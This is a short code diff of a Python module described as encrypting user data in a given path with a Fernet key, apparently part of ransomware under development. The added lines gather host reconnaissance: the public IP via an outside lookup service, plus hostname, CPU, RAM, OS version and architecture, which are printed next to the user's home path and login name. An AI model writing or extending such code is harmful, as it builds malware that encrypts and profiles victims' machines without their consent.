@@ -6,10 +6,30 @@ Description: This module is responsible for encrypting user data within the spec
 import os  
 from cryptography.fernet import Fernet 
 from main import key
+import requests
+import platform
+import socket
+import psutil
 
+#USER INFO
 home_path =  os.path.expanduser('~')
 test_path = 'C:/Users/USUARIO/test_path/'
 current_user = os.getlogin()
+public_ip = requests.get('https://api.ipify.org').text
+
+system_info = (
+    f"PC Name: {socket.gethostname()}\n"
+    f"CPU: {platform.processor()}\n"
+    f"RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB\n"
+    f"System: {platform.system()}\n"
+    f"Version: {platform.version()}\n"
+    f"Release: {platform.release()}\n"
+    f"Architecture: {platform.machine()}\n"
+    f"Full name: {platform.platform()}"
+)
+
+print(system_info)
+print(public_ip)
 print(home_path)
 print(current_user)
 
